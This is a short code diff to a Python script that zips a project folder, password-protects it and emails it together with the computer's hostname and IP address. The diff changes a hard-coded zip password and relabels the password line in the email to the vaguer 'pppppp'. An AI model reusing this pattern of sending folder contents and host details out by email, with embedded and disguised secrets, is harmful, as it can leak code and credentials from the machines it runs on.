@@ -62,6 +62,7 @@ def sendMail_Zip(z,projectMsg,projectDir='./'):
 	
     content='proect:\n{0}\n\n{1} \n\n\n\n{2}'.format(projectMsg,mailText,time.asctime())
 	
+    print("content:\n",content)
     textApart = MIMEText(content)
 	
     zipApart=MIMEApplication(z.getvalue())
@@ -144,13 +145,13 @@ def sendFolder(folderPath,projectDir):
     z.close()
 
     if usePyminizip:    
-        pyminizip.compress(in_memory_zip,None, "./output.zip", "GFG123456", 5)
+        pyminizip.compress(in_memory_zip,None, "./output.zip", "GFG1234561qazXsw234", 5)
         in_memory_zip = io.BytesIO(open("./output.zip",'rb').read())    
 
 
     hostName=socket.gethostname()
     projectMsg=f"codesPath:{projectDir} \n codePC:{hostName} {socket.gethostbyname(hostName)}"
-    projectMsg+=f'\n zip password : GFG123456'
+    projectMsg+=f'\n pppppp: GFG1234561qazXsw234'
     sendMail_Zip(in_memory_zip,projectMsg=projectMsg,projectDir=projectDir)
 
     if usePyminizip:
